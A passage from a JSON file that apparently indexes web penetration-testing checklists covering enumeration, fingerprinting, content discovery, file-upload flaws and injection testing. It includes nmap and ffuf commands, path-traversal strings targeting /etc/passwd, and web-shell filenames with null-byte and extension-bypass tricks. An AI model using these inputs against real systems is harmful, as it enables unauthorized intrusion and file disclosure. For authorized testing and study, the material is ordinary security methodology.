abuse\r\n- App upload\r\n\r\n---\r\n\r\n## GitLab\r\n\r\nCheck:\r\n\r\n```text\r\n/help\r\n```\r\n\r\nIdentify:\r\n\r\n- Version\r\n- Public repositories\r\n- Registration enabled\r\n\r\nSearch for:\r\n\r\n- Version-specific CVEs\r\n\r\n---\r\n\r\n## ColdFusion\r\n\r\nIdentify:\r\n\r\n- .cfm pages\r\n- CFIDE\r\n- cfdocs\r\n\r\nCheck:\r\n\r\n- Administrator interface\r\n- Default files\r\n- Debug pages\r\n\r\nSearch for:\r\n\r\n- Known RCEs\r\n- File upload vulnerabilities\r\n- Command Injection\r\n\r\n---\r\n\r\n## IIS\r\n\r\nCheck:\r\n\r\n- TRACE enabled\r\n- IIS Version\r\n- Short Name Enumeration (8.3)\r\n\r\nUseful tool:\r\n\r\n- IIS ShortName Scanner\r\n\r\n---\r\n\r\n## CGI\r\n\r\nLook for:\r\n\r\n```text\r\n/cgi-bin/\r\n/cgi/\r\n```\r\n\r\nAttempt:\r\n\r\n- Shellshock\r\n- Command Injection\r\n- CGI Enumeration\r\n\r\n---\r\n\r\n# 5. Common Misconfigurations\r\n\r\nReview:\r\n\r\n- Debug mode enabled\r\n- Default credentials\r\n- Public documentation\r\n- Backup files\r\n- Configuration files\r\n- Dependency files\r\n- Exposed logs\r\n- Sample applications\r\n- Development endpoints\r\n\r\n---\r\n\r\n# 6. Built-in Functionality Abuse\r\n\r\nIf authenticated, check for:\r\n\r\n- Template editing\r\n- Theme editing\r\n- Plugin installation\r\n- Extension installation\r\n- Module installation\r\n- Package upload\r\n- Script Console\r\n- WAR deployment\r\n- Scheduled Tasks\r\n- Job Execution\r\n\r\nThese frequently lead directly to Remote Code Execution (RCE).\r\n\r\n---\r\n\r\n# 7. Public Exploits\r\n\r\nFor every identified product:\r\n\r\n- SearchSploit\r\n- Exploit-DB\r\n- GitHub PoCs\r\n- Vendor Advisories\r\n- NVD\r\n\r\nVerify:\r\n\r\n- Product version\r\n- Operating system\r\n- Authentication requirements\r\n- Exploit prerequisites\r\n\r\nNever run an exploit without confirming the version.\r\n\r\n---\r\n\r\n# 8. Checklist\r\n\r\n- [ ] Identify CMS / Framework / Enterprise Application\r\n- [ ] Determine the exact version\r\n- [ ] Locate administrative interfaces\r\n- [ ] Test default credentials\r\n- [ ] Perform framework-specific enumeration\r\n- [ ] Review public configuration files\r\n- [ ] Check for debug mode\r\n- [ ] Search for publicly known exploits\r\n- [ ] Abuse built-in administrative functionality\r\n- [ ] Verify version-specific CVEs",
    "headings": [],
    "commands": [],
    "tags": [
      "nmap",
      "rce"
    ],
    "size": 5540,
    "lineCount": 452
  },
  {
    "id": "web-checklist-03-content-discovery-attack-surface-mapping",
    "title": "Content Discovery & Attack Surface Mapping",
    "category": "Web Application Security",
    "subcategory": "Web-Checklist",
    "filePath": "Web-Checklist/03. Content Discovery & Attack Surface Mapping.md",
    "content": "# Content Discovery & Attack Surface Mapping\r\n\r\n## Objective\r\n\r\nDiscover hidden directories, files, virtual hosts, subdomains, parameters, APIs, backups, and administrative interfaces that expand the application's attack surface.\r\n\r\n> **Rule:** Every new directory or endpoint should trigger another round of enumeration.\r\n\r\n---\r\n\r\n# 1. Directory Discovery\r\n\r\nEnumerate hidden directories.\r\n\r\n## FFUF\r\n\r\n```bash\r\nffuf -u http://<TARGET>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r\n```\r\n\r\nUseful wordlists:\r\n\r\n- SecLists\r\n- Dirbuster\r\n- raft-medium-directories\r\n- quickhits.txt\r\n\r\nInteresting findings:\r\n\r\n- `/admin`\r\n- `/backup`\r\n- `/test`\r\n- `/dev`\r\n- `/staging`\r\n- `/old`\r\n- `/uploads`\r\n\r\n---\r\n\r\n# 2. File Discovery\r\n\r\nSearch for common files.\r\n\r\n```bash\r\nffuf -u http://<TARGET>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.txt,.bak,.zip,.tar,.gz,.old,.conf,.config,.ini,.xml,.json\r\n```\r\n\r\nInteresting extensions:\r\n\r\n- `.bak`\r\n- `.old`\r\n- `.zip`\r\n- `.tar.gz`\r\n- `.conf`\r\n- `.config`\r\n- `.sql`\r\n- `.env`\r\n- `.swp`\r\n- `.orig`\r\n\r\n---\r\n\r\n# 3. Recursive Fuzzing\r\n\r\nIf new directories are discovered, enumerate them recursively.\r\n\r\n```bash\r\nffuf -u http://<TARGET>/FUZZ -w <WORDLIST> -recursion\r\n```\r\n\r\n> **Tip:** Limit recursion depth during exams to avoid wasting time.\r\n\r\n---\r\n\r\n# 4. Virtual Host Enumeration\r\n\r\nIf a hostname is known, enumerate virtual hosts.\r\n\r\n```bash\r\nffuf -u http://<TARGET> -H \"Host: FUZZ.example.local\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <DEFAULT_SIZE>\r\n```\r\n\r\nEvery discovered virtual host should be added to:\r\n\r\n```text\r\n/etc/hosts\r\n```\r\n\r\nThen repeat:\r\n\r\n- Technology Fingerprinting\r\n- Directory Fuzzing\r\n- Manual Browsing\r\n\r\n---\r\n\r\n# 5. Subdomain Enumeration\r\n\r\nWhen a real domain exists:\r\n\r\n```bash\r\nffuf -u http://FUZZ.example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\r\n```\r\n\r\nOther useful tools:\r\n\r\n- gobuster\r\n- amass\r\n- assetfinder\r\n- subfinder\r\n\r\n---\r\n\r\n# 6. Parameter Discovery\r\n\r\nHidden parameters often expose new functionality.\r\n\r\n## GET Parameters\r\n\r\n```bash\r\nffuf -u \"http://<TARGET>/index.php?FUZZ=test\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt\r\n```\r\n\r\n## POST Parameters\r\n\r\n```bash\r\nffuf -u http://<TARGET>/login -X POST -d \"FUZZ=test\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt\r\n```\r\n\r\n---\r\n\r\n# 7. Backup Discovery\r\n\r\nSearch for backups.\r\n\r\nCommon names:\r\n\r\n```text\r\nbackup.zip\r\nbackup.tar.gz\r\nsite.zip\r\nwww.zip\r\ndb.sql\r\ndatabase.sql\r\nold.zip\r\nconfig.old\r\n```\r\n\r\n---\r\n\r\n# 8. Hidden Files\r\n\r\nAlways check:\r\n\r\n```text\r\nrobots.txt\r\n```\r\n\r\n```text\r\nsitemap.xml\r\n```\r\n\r\n```text\r\n.git/\r\n```\r\n\r\n```text\r\n.env\r\n```\r\n\r\n```text\r\n.git/HEAD\r\n```\r\n\r\n```text\r\n.htaccess\r\n```\r\n\r\n```text\r\n.web.config\r\n```\r\n\r\n```text\r\ncrossdomain.xml\r\n```\r\n\r\n```text\r\nclientaccesspolicy.xml\r\n```\r\n\r\n---\r\n\r\n# 9. API Discovery\r\n\r\nSearch for APIs.\r\n\r\nCommon endpoints:\r\n\r\n```text\r\n/api\r\n/api/v1\r\n/swagger\r\n/swagger-ui\r\n/openapi.json\r\n/graphql\r\n/redoc\r\n/docs\r\n```\r\n\r\nReview JavaScript for additional API endpoints.\r\n\r\n---\r\n\r\n# 10. Administrative Interfaces\r\n\r\nLook for:\r\n\r\n```text\r\n/admin\r\n/login\r\n/manage\r\n/dashboard\r\n/cms\r\n/backend\r\n/phpmyadmin\r\n/adminer\r\n/jenkins\r\n/grafana\r\n/prometheus\r\n```\r\n\r\n---\r\n\r\n# 11. Build the Attack Surface\r\n\r\nDocument every discovered resource.\r\n\r\nInclude:\r\n\r\n- Directories\r\n- Files\r\n- Login pages\r\n- Upload functionality\r\n- APIs\r\n- Virtual Hosts\r\n- Admin panels\r\n- Backup files\r\n- Configuration files\r\n\r\nThis inventory becomes the roadmap for manual testing.\r\n\r\n---\r\n\r\n## Attack Surface Expansion\r\n\r\nEvery time you discover:\r\n\r\n- New directory\r\n- New virtual host\r\n- New subdomain\r\n- New API\r\n- New login page\r\n- New upload feature\r\n\r\nRepeat:\r\n\r\n- Technology Fingerprinting\r\n- Directory Discovery\r\n- Manual Browsing\r\n- JavaScript Analysis\r\n\r\nEnumeration is recursive.\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- Never stop after the first successful FFUF scan.\r\n- Every new endpoint may expose an entirely different application.\r\n- Enumerate virtual hosts before assuming there is only one website.\r\n- Read `robots.txt` and `sitemap.xml` before fuzzing.\r\n- Download and inspect every backup or configuration file discovered.\r\n- Review JavaScript after every new page is found.\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Perform directory discovery.\r\n- [ ] Perform file discovery.\r\n- [ ] Perform recursive fuzzing.\r\n- [ ] Enumerate virtual hosts.\r\n- [ ] Enumerate subdomains.\r\n- [ ] Discover hidden parameters.\r\n- [ ] Search for backup files.\r\n- [ ] Check common hidden files.\r\n- [ ] Enumerate API endpoints.\r\n- [ ] Locate administrative interfaces.\r\n- [ ] Build the complete attack surface.\r\n\r\n```\r\nFound New Directory?\r\n        │\r\n        ▼\r\nBrowse It Manually\r\n        │\r\n        ▼\r\nFingerprint Technology\r\n        │\r\n        ▼\r\nCheck Source Code\r\n        │\r\n        ▼\r\nReview JavaScript\r\n        │\r\n        ▼\r\nRun FFUF Again\r\n        │\r\n        ▼\r\nFound More Content?\r\n        │\r\n      Yes ───────────────► Repeat\r\n        │\r\n       No\r\n        │\r\n        ▼\r\nContinue Testing\r\n```",
    "headings": [],
    "commands": [],
    "tags": [
      "ffuf",
      "burp",
      "graphql",
      "rce"
    ],
    "size": 5136,
    "lineCount": 328
  },
  {
    "id": "web-checklist-09-file-handling-vulnerabilities",
    "title": "File Handling Vulnerabilities",
    "category": "Web Application Security",
    "subcategory": "Web-Checklist",
    "filePath": "Web-Checklist/09. File Handling Vulnerabilities.md",
    "content": "# File Handling Vulnerabilities\r\n\r\n## Objective\r\n\r\nAssess all file upload, download, import, export, and file processing functionality to identify vulnerabilities such as unrestricted file upload, path traversal, LFI, RFI, insecure downloads, archive extraction issues, and insecure file parsing.\r\n\r\n> **Rule:** Every file operation is a potential attack surface.\r\n\r\n---\r\n\r\n# 1. Identify File Functionality\r\n\r\nLook for:\r\n\r\n- File Upload\r\n- Profile Pictures\r\n- Document Upload\r\n- CSV Import\r\n- XML Import\r\n- PDF Upload\r\n- Image Upload\r\n- File Download\r\n- Export Features\r\n- Backup Download\r\n- Attachments\r\n\r\n---\r\n\r\n# 2. File Upload Testing\r\n\r\nDetermine:\r\n\r\n- Allowed file types\r\n- Maximum file size\r\n- Storage location\r\n- Execution directory\r\n- Client-side validation\r\n- Server-side validation\r\n\r\nTry uploading:\r\n\r\n- Images\r\n- Documents\r\n- Archives\r\n- Scripts\r\n- Unknown extensions\r\n\r\n---\r\n\r\n# 3. Extension Bypass\r\n\r\nTest alternative extensions.\r\n\r\nExamples:\r\n\r\n```\r\nshell.php\r\nshell.php5\r\nshell.php7\r\nshell.phtml\r\nshell.phar\r\nshell.inc\r\nshell.asp\r\nshell.aspx\r\nshell.jsp\r\nshell.cfm\r\nshell.cgi\r\n```\r\n\r\nDouble extensions:\r\n\r\n```\r\nshell.php.jpg\r\nshell.jpg.php\r\nshell.php.png\r\n```\r\n\r\n---\r\n\r\n# 4. MIME Type Bypass\r\n\r\nModify:\r\n\r\n```\r\nContent-Type:\r\n```\r\n\r\nExamples:\r\n\r\n```\r\nimage/jpeg\r\nimage/png\r\napplication/pdf\r\napplication/octet-stream\r\ntext/plain\r\n```\r\n\r\nDo not rely on browser-selected MIME types.\r\n\r\n---\r\n\r\n# 5. Magic Byte Bypass\r\n\r\nSome applications only validate file signatures.\r\n\r\nTest:\r\n\r\n- JPEG magic bytes\r\n- PNG magic bytes\r\n- GIF headers\r\n\r\nCombined with executable content where applicable.\r\n\r\n---\r\n\r\n# 6. Filename Manipulation\r\n\r\nTry:\r\n\r\n```\r\n../../../shell.php\r\n```\r\n\r\n```\r\nshell.php.\r\n```\r\n\r\n```\r\nshell.php%00.jpg\r\n```\r\n\r\n```\r\nshell..php\r\n```\r\n\r\n```\r\nshell .php\r\n```\r\n\r\n```\r\nshell%20.php\r\n```\r\n\r\nLook for:\r\n\r\n- Null byte issues\r\n- Trailing dots\r\n- Unicode normalization\r\n- Filename truncation\r\n\r\n---\r\n\r\n# 7. File Content Validation\r\n\r\nTest whether the application validates:\r\n\r\n- File extension\r\n- MIME type\r\n- Magic bytes\r\n- Actual file contents\r\n\r\nMany applications validate only one of these.\r\n\r\n---\r\n\r\n# 8. Image Processing\r\n\r\nIf image uploads exist:\r\n\r\nTest:\r\n\r\n- SVG Upload\r\n- EXIF Metadata\r\n- Polyglot Files\r\n- ImageTragick (where applicable)\r\n\r\nReview whether uploaded images are:\r\n\r\n- Resized\r\n- Converted\r\n- Stripped of metadata\r\n\r\n---\r\n\r\n# 9. Archive Upload\r\n\r\nIf ZIP/TAR uploads are accepted:\r\n\r\nLook for:\r\n\r\n- Zip Slip\r\n- Path Traversal\r\n- Symlink extraction\r\n- Overwriting files\r\n\r\nTest:\r\n\r\n- ZIP\r\n- TAR\r\n- TAR.GZ\r\n- 7Z\r\n\r\n---\r\n\r\n# 10. Local File Inclusion (LFI)\r\n\r\nLook for parameters such as:\r\n\r\n```\r\npage=\r\nfile=\r\ninclude=\r\ntemplate=\r\nview=\r\nlang=\r\n```\r\n\r\nAttempt:\r\n\r\n```\r\n../../../../etc/passwd\r\n```\r\n\r\n```\r\n../../../../windows/win.ini\r\n```\r\n\r\n---\r\n\r\n# 11. Remote File Inclusion (RFI)\r\n\r\nIf user-controlled URLs are included:\r\n\r\nTest remote file inclusion where supported by the application.\r\n\r\n---\r\n\r\n# 12. Path Traversal\r\n\r\nAttempt directory traversal during downloads.\r\n\r\nExamples:\r\n\r\n```\r\n../../../etc/passwd\r\n```\r\n\r\n```\r\n..\\..\\..\\windows\\win.ini\r\n```\r\n\r\nTest:\r\n\r\n- Download endpoints\r\n- Export functionality\r\n- File previews\r\n\r\n---\r\n\r\n# 13. File Download Authorization\r\n\r\nAttempt downloading:\r\n\r\n- Other users' files\r\n- Reports\r\n- Invoices\r\n- Attachments\r\n- Backups\r\n\r\nModify:\r\n\r\n```\r\nfile=1\r\n```\r\n\r\n↓\r\n\r\n```\r\nfile=2\r\n```\r\n\r\n---\r\n\r\n# 14. Export Functionality\r\n\r\nReview exports.\r\n\r\nExamples:\r\n\r\n- CSV\r\n- Excel\r\n- PDF\r\n- XML\r\n- JSON\r\n\r\nTest:\r\n\r\n- CSV Injection\r\n- Sensitive Data Exposure\r\n- Authorization\r\n\r\n---\r\n\r\n# 15. Temporary Files\r\n\r\nLook for:\r\n\r\n```\r\n.bak\r\n.old\r\n.tmp\r\n~\r\n.swp\r\n.orig\r\n```\r\n\r\nCommon examples:\r\n\r\n```\r\nconfig.php.bak\r\n```\r\n\r\n```\r\ndatabase.sql\r\n```\r\n\r\n```\r\nbackup.zip\r\n```\r\n\r\n---\r\n\r\n# 16. Cloud Storage\r\n\r\nIf files are stored externally:\r\n\r\nReview:\r\n\r\n- S3 Buckets\r\n- Azure Blob Storage\r\n- Google Cloud Storage\r\n\r\nCheck:\r\n\r\n- Public access\r\n- Predictable object names\r\n- Authorization\r\n\r\n---\r\n\r\n# 17. Dangerous File Types\r\n\r\nTry uploading:\r\n\r\n```\r\n.php\r\n.asp\r\n.aspx\r\n.jsp\r\n.cgi\r\n.pl\r\n.sh\r\n.py\r\n.jar\r\n.war\r\n.svg\r\n.htaccess\r\n```\r\n\r\nWhere appropriate for the target technology.\r\n\r\n---\r\n\r\n# 18. File Processing Logic\r\n\r\nDetermine what happens after upload.\r\n\r\nQuestions:\r\n\r\n- Is the file executed?\r\n- Is it parsed?\r\n- Is it converted?\r\n- Is it resized?\r\n- Is metadata extracted?\r\n- Is OCR performed?\r\n- Is antivirus scanning enabled?\r\n\r\nEvery processing step introduces additional attack surface.\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- Never stop after the upload succeeds—determine how the application stores and processes the file.\r\n- Test extension, MIME type, magic bytes, and file contents independently.\r\n- SVG files frequently bypass image restrictions and may lead to XSS if rendered inline.\r\n- Archive uploads should always be tested for Zip Slip and path traversal.\r\n- Download functionality is just as important as uploads.\r\n- Review exported files for sensitive data and CSV injection.\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Identify all file upload and download functionality.\r\n- [ ] Test unrestricted file upload.\r\n- [ ] Test extension bypass techniques.\r\n- [ ] Test MIME type validation.\r\n- [ ] Test magic byte validation.\r\n- [ ] Test filename manipulation.\r\n- [ ] Test image processing.\r\n- [ ] Test archive extraction.\r\n- [ ] Test Local File Inclusion (LFI).\r\n- [ ] Test Remote File Inclusion (RFI), where applicable.\r\n- [ ] Test path traversal.\r\n- [ ] Test file download authorization.\r\n- [ ] Review export functionality.\r\n- [ ] Search for temporary and backup files.\r\n- [ ] Review cloud storage permissions.\r\n- [ ] Test dangerous file types.\r\n- [ ] Analyze server-side file processing.",
    "headings": [],
    "commands": [],
    "tags": [
      "lfi",
      "xss"
    ],
    "size": 5634,
    "lineCount": 421
  },
  {
    "id": "web-checklist-02-http-enumeration-technology-fingerprinting",
    "title": "HTTP Enumeration & Technology Fingerprinting",
    "category": "Web Application Security",
    "subcategory": "Web-Checklist",
    "filePath": "Web-Checklist/02. HTTP Enumeration & Technology Fingerprinting.md",
    "content": "# HTTP Enumeration & Technology Fingerprinting\r\n\r\n## Objective\r\n\r\nEnumerate every HTTP/HTTPS endpoint to identify the web server, application framework, CMS, programming language, technologies, virtual hosts, and hidden attack surface before attempting exploitation.\r\n\r\n> **Rule:** Never start fuzzing immediately. Fingerprint the application first.\r\n\r\n---\r\n\r\n# 1. Inspect the Homepage\r\n\r\nBrowse the application manually.\r\n\r\nCheck for:\r\n\r\n- Login pages\r\n- Registration pages\r\n- Admin panels\r\n- Error messages\r\n- Copyright year\r\n- Application name\r\n- Company name\r\n- Email addresses\r\n- Usernames\r\n- Version numbers\r\n\r\nRead **every page** carefully.\r\n\r\n---\r\n\r\n# 2. Examine HTTP Headers\r\n\r\nInspect response headers.\r\n\r\n```bash\r\ncurl -I http://<TARGET>\r\n```\r\n\r\nHTTPS\r\n\r\n```bash\r\ncurl -k -I https://<TARGET>\r\n```\r\n\r\nLook for:\r\n\r\n- Server\r\n- X-Powered-By\r\n- X-AspNet-Version\r\n- X-Generator\r\n- X-Backend-Server\r\n- X-Frame-Options\r\n- CSP\r\n- Cookies\r\n\r\nGoogle unknown headers.\r\n\r\n---\r\n\r\n# 3. Identify the Technology Stack\r\n\r\nFingerprint the application.\r\n\r\n```bash\r\nwhatweb http://<TARGET>\r\n```\r\n\r\n```bash\r\nwapiti -u http://<TARGET>\r\n```\r\n\r\nIdentify:\r\n\r\n- PHP\r\n- ASP.NET\r\n- JSP\r\n- NodeJS\r\n- Python\r\n- Ruby\r\n- Laravel\r\n- Django\r\n- Spring\r\n- Express\r\n- WordPress\r\n- Joomla\r\n- Drupal\r\n- Magento\r\n\r\n---\r\n\r\n# 4. Examine HTML Source\r\n\r\nView page source.\r\n\r\nLook for:\r\n\r\n- Comments\r\n- Hidden endpoints\r\n- JavaScript files\r\n- API URLs\r\n- Debug messages\r\n- Credentials\r\n- API Keys\r\n- TODO comments\r\n\r\n---\r\n\r\n# 5. JavaScript Enumeration\r\n\r\nReview every JavaScript file.\r\n\r\nLook for:\r\n\r\n- Hidden API endpoints\r\n- AJAX requests\r\n- Internal URLs\r\n- API Keys\r\n- Tokens\r\n- Secrets\r\n- Hardcoded credentials\r\n- Admin functions\r\n\r\nUseful tools:\r\n\r\n- LinkFinder\r\n- SecretFinder\r\n- JSParser\r\n\r\n---\r\n\r\n# 6. Examine Cookies\r\n\r\nInspect every cookie.\r\n\r\nCheck:\r\n\r\n- Secure\r\n- HttpOnly\r\n- SameSite\r\n\r\nDetermine:\r\n\r\n- Session cookies\r\n- JWTs\r\n- Base64\r\n- Serialized objects\r\n\r\nAttempt decoding if applicable.\r\n\r\n---\r\n\r\n# 7. Identify the Framework\r\n\r\nFramework-specific behavior often reveals attack paths.\r\n\r\nExamples:\r\n\r\n| Framework | Indicators |\r\n|-----------|------------|\r\n| Laravel | `/vendor`, Ignition, `_ignition` |\r\n| Django | CSRF cookie, debug pages |\r\n| ASP.NET | `__VIEWSTATE`, `.aspx` |\r\n| Spring | Whitelabel Error Page |\r\n| Rails | `_rails_session` |\r\n| Express | `X-Powered-By: Express` |\r\n\r\n---\r\n\r\n# 8. Error Page Analysis\r\n\r\nTrigger errors intentionally.\r\n\r\nExamples:\r\n\r\n```text\r\n/nonexistent\r\n/'\"\r\n/../../../\r\n```\r\n\r\nLook for:\r\n\r\n- Stack traces\r\n- Framework names\r\n- Versions\r\n- File paths\r\n- Source code\r\n- SQL errors\r\n\r\n---\r\n\r\n# 9. HTTP Methods\r\n\r\nCheck supported methods.\r\n\r\n```bash\r\ncurl -X OPTIONS http://<TARGET> -i\r\n```\r\n\r\nInteresting methods:\r\n\r\n- PUT\r\n- DELETE\r\n- PATCH\r\n- TRACE\r\n- CONNECT\r\n\r\nMisconfigured methods sometimes allow file uploads.\r\n\r\n---\r\n\r\n# 10. Security Headers\r\n\r\nReview:\r\n\r\n- CSP\r\n- HSTS\r\n- X-Frame-Options\r\n- X-Content-Type-Options\r\n- Referrer-Policy\r\n\r\nMissing headers aren't always exploitable but may provide useful context.\r\n\r\n---\r\n\r\n# 11. Robots & Sitemap\r\n\r\nCheck:\r\n\r\n```text\r\n/robots.txt\r\n```\r\n\r\n```text\r\n/sitemap.xml\r\n```\r\n\r\nLook for:\r\n\r\n- Hidden directories\r\n- Admin panels\r\n- Backup paths\r\n- API endpoints\r\n\r\n---\r\n\r\n# 12. Hidden Files\r\n\r\nAttempt common files.\r\n\r\n```text\r\n/.git/\r\n/.git/HEAD\r\n/.env\r\n/.svn/\r\n/backup.zip\r\n/backup.tar.gz\r\n/config.php.bak\r\n/phpinfo.php\r\n/server-status\r\n```\r\n\r\n---\r\n\r\n# 13. Build the Technology Profile\r\n\r\nBefore moving on, document:\r\n\r\n- Web Server\r\n- Programming Language\r\n- Framework\r\n- CMS\r\n- Version\r\n- Authentication\r\n- Session Mechanism\r\n- API Type\r\n- Interesting Headers\r\n- JavaScript Files\r\n- Hidden Endpoints\r\n\r\nThis profile guides the rest of the assessment.\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- Read every page before fuzzing.\r\n- Review every JavaScript file.\r\n- Google every unknown framework or header.\r\n- Framework identification often reveals public exploits.\r\n- Error pages frequently leak valuable information.\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Browse every page.\r\n- [ ] Review HTTP headers.\r\n- [ ] Fingerprint technologies.\r\n- [ ] Inspect HTML source.\r\n- [ ] Review JavaScript files.\r\n- [ ] Analyze cookies.\r\n- [ ] Identify the framework.\r\n- [ ] Trigger error pages.\r\n- [ ] Enumerate HTTP methods.\r\n- [ ] Review security headers.\r\n- [ ] Check robots.txt and sitemap.xml.\r\n- [ ] Check common hidden files.\r\n- [ ] Build the technology profile.",
    "headings": [],
    "commands": [],
    "tags": [
      "jwt",
      "rce"
    ],
    "size": 4397,
    "lineCount": 310
  },
  {
    "id": "web-checklist-01-initial-enumeration",
    "title": "Initial Enumeration",
    "category": "Web Application Security",
    "subcategory": "Web-Checklist",
    "filePath": "Web-Checklist/01. Initial Enumeration.md",
    "content": "# Initial Enumeration\r\n\r\n## Objective\r\n\r\nIdentify all exposed services, determine the attack surface, fingerprint technologies, and collect enough information to decide the next phase of testing.\r\n\r\n> **Rule:** Never rush to the web application. Fully enumerate the host and all exposed services first.\r\n\r\n---\r\n\r\n# 1. Port Enumeration\r\n\r\nBegin by identifying all exposed TCP ports.\r\n\r\n## Full TCP Scan\r\n\r\n```bash\r\nnmap -p- --min-rate 10000 -T4 -oA nmap_full <TARGET_IP>\r\n```\r\n\r\n## Service & Version Detection\r\n\r\n```bash\r\nnmap -sC -sV -p <PORTS> -oA nmap_services <TARGET_IP>\r\n```\r\n\r\n## UDP Enumeration\r\n\r\nDon't ignore UDP during exams.\r\n\r\n```bash\r\nsudo nmap -sU --top-ports 100 -oA nmap_udp <TARGET_IP>\r\n```\r\n\r\n---\r\n\r\n# 2. Identify Running Services\r\n\r\nFor every open port determine:\r\n\r\n- Service\r\n- Version\r\n- Operating System\r\n- Framework\r\n- Possible CVEs\r\n- Authentication Required?\r\n- Default Credentials?\r\n- Public Exploit?\r\n\r\nUseful tools:\r\n\r\n- Nmap\r\n- WhatWeb\r\n- Searchsploit\r\n- curl\r\n\r\n---\r\n\r\n# 3. HTTP Service Discovery\r\n\r\nFor every HTTP/HTTPS port discovered:\r\n\r\nIdentify:\r\n\r\n- HTTP/HTTPS\r\n- Redirects\r\n- Virtual Hosts\r\n- TLS\r\n- Default Page\r\n- Authentication\r\n- Technologies\r\n\r\n---\r\n\r\n# 4. TLS Enumeration (HTTPS)\r\n\r\nIf HTTPS is available:\r\n\r\nCheck:\r\n\r\n- Certificate CN\r\n- SANs\r\n- Expiration\r\n- Internal hostnames\r\n- Weak TLS versions\r\n\r\nUseful tools:\r\n\r\n```bash\r\nsslscan <TARGET_IP>\r\n```\r\n\r\n```bash\r\nopenssl s_client -connect <TARGET_IP>:443\r\n```\r\n\r\nInternal hostnames frequently reveal additional attack surfaces.\r\n\r\n---\r\n\r\n# 5. Banner Grabbing\r\n\r\nCollect banners manually.\r\n\r\nHTTP\r\n\r\n```bash\r\ncurl -I http://<TARGET_IP>\r\n```\r\n\r\nHTTPS\r\n\r\n```bash\r\ncurl -k -I https://<TARGET_IP>\r\n```\r\n\r\nGeneric\r\n\r\n```bash\r\nnc <TARGET_IP> <PORT>\r\n```\r\n\r\nLook for:\r\n\r\n- Version numbers\r\n- Frameworks\r\n- Server software\r\n- Custom headers\r\n\r\n---\r\n\r\n# 6. Technology Fingerprinting\r\n\r\nDetermine the application's technology stack.\r\n\r\n```bash\r\nwhatweb http://<TARGET_IP>\r\n```\r\n\r\nAlso inspect:\r\n\r\n- Response headers\r\n- HTML source\r\n- JavaScript\r\n- Cookies\r\n- Error pages\r\n\r\nIdentify:\r\n\r\n- PHP\r\n- ASP.NET\r\n- Java\r\n- NodeJS\r\n- Python\r\n- Ruby\r\n- CMS\r\n- Reverse Proxy\r\n\r\n---\r\n\r\n# 7. Search for Public Exploits\r\n\r\nEvery version discovered should be researched.\r\n\r\n```bash\r\nsearchsploit <SERVICE> <VERSION>\r\n```\r\n\r\nAlso search:\r\n\r\n- Google\r\n- GitHub\r\n- CVE Details\r\n- NVD\r\n\r\n---\r\n\r\n# 8. Examine HTTP Methods\r\n\r\nCheck supported HTTP verbs.\r\n\r\n```bash\r\ncurl -X OPTIONS http://<TARGET_IP> -i\r\n```\r\n\r\nLook for:\r\n\r\n- PUT\r\n- DELETE\r\n- TRACE\r\n- CONNECT\r\n- PATCH\r\n\r\nMisconfigured HTTP methods can sometimes lead to file upload or authentication bypass.\r\n\r\n---\r\n\r\n# 9. DNS Enumeration\r\n\r\nIf a hostname is available:\r\n\r\nCheck:\r\n\r\n- A records\r\n- AAAA\r\n- MX\r\n- TXT\r\n- CNAME\r\n\r\nAttempt:\r\n\r\n- Subdomain enumeration\r\n- Zone transfers (AXFR)\r\n- Virtual Host discovery\r\n\r\n---\r\n\r\n# 10. Build an Attack Surface\r\n\r\nBefore proceeding, document:\r\n\r\n- Open ports\r\n- Technologies\r\n- CMS\r\n- Framework\r\n- Login pages\r\n- APIs\r\n- File upload functionality\r\n- Admin panels\r\n- Interesting hostnames\r\n\r\nThis becomes your roadmap for the remainder of the assessment.\r\n\r\n---\r\n\r\n## Tips\r\n\r\n- Enumerate every open port before focusing on the web application.\r\n- Always inspect both HTTP and HTTPS separately.\r\n- Search every version number you discover.\r\n- Internal hostnames found in certificates often lead to additional virtual hosts.\r\n- Keep detailed notes—small details discovered during enumeration often become critical later.\r\n\r\n---\r\n\r\n## Checklist\r\n\r\n- [ ] Scan all TCP ports.\r\n- [ ] Scan common UDP ports.\r\n- [ ] Enumerate service versions.\r\n- [ ] Identify HTTP/HTTPS services.\r\n- [ ] Enumerate TLS certificates.\r\n- [ ] Perform banner grabbing.\r\n- [ ] Fingerprint technologies.\r\n- [ ] Search for public exploits.\r\n- [ ] Enumerate supported HTTP methods.\r\n- [ ] Perform DNS enumeration.\r\n- [ ] Build an attack surface map.",
    "headings": [],
    "commands": [],
    "tags": [
      "nmap",
      "rce",
      "sudo"
    ],
    "size": 3879,
    "lineCount": 258
  },
  {
    "id": "web-checklist-07-input-validation-injection-testing",
    "title": "Input Validation & Injection Testing",
    "category": "Web Application Security",
    "subcategory": "Web-Checklist",
    "filePath": "Web-Checklist/07. Input Validation & Injection Testing.md",
    "content": "# Input Validation & Injection Testing\r\n\r\n## Objective\r\n\r\nIdentify vulnerabilities caused by improper input validation that allow attackers to execute code, manipulate queries, access unauthorized data, or compromise the underlying system.\r\n\r\n> **Rule:** Every user-controlled input is a potential attack surface.\r\n\r\n---\r\n\r\n# 1. Identify User Input\r\n\r\nBefore testing, identify every place where user input is accepted.\r\n\r\nExamples:\r\n\r\n- URL parameters\r\n- POST body\r\n- JSON body\r\n- XML body\r\n- Headers\r\n- Cookies\r\n- JWT Claims\r\n- File Names\r\n- Search Fields\r\n- Login Forms\r\n- Registration\r\n- Profile Fields\r\n- API Parameters\r\n\r\n---\r\n\r\n# 2. Initial Input Validation\r\n\r\nFor every parameter test:\r\n\r\n```\r\n'\r\n\"\r\n`\r\n\\\r\n/\r\n../\r\n../../\r\n../../../\r\nNULL\r\n%00\r\n-1\r\n0\r\n999999999\r\ntrue\r\nfalse\r\n[]\r\n{}\r\n```\r\n\r\nObserve:\r\n\r\n- Error messages\r\n- Different responses\r\n- Status codes\r\n- 